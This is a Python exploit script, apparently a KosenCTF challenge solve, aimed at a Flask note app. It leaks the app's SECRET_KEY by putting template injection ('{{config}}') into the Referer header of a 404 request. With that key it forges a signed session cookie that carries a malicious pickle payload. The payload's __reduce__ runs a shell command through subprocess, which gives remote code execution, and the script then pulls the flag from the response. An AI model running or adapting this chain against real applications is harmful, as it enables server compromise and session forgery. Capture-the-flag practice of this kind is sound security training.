# coding: utf-8
import re
import base64
import hashlib
import pickle
import requests
import os
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

host = os.getenv("HOST", '0.0.0.0')
port = os.getenv("PORT", '8001')
url_new = "http://{}:{}/new".format(host, port)
url_note = "http://{}:{}/note/0".format(host, port)
url_404 = "http://{}:{}/qwerty".format(host, port)
url_referer = "http://{}:{}/{{{{config}}}}".format(host, port)

# leak the secret key
r = requests.get(url_404, headers={'referer': url_referer})
result = re.findall(b"SECRET_KEY&#39;: b&#39;(.+)&#39;, &#39;PERMANENT_SESSION_LIFETIME", r.text.encode("ascii"))
key = eval(b'b"' + result[0] + b'"')

# get a valid session
r = requests.get(url_new, allow_redirects=False)
session = r.cookies.get("session")

# decode
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
s = URLSafeTimedSerializer(
    key,
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)
data = s.loads(session)

cmd = ["ls", "-l"]
# inject
class Evil(object):
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (self.cmd, ))
evil = [
    {"date": "", "text": "", "title": Evil(cmd)}
]
data['savedata'] = base64.b64encode(pickle.dumps(evil))
# generate
cookies = {
    "session": s.dumps(data)
}
r = requests.get(url_note, cookies=cookies)
result = re.findall(b"KosenCTF\{.+\}", r.text.encode("ascii"))
if result:
    print(result[0])
else:
    print(r.text)
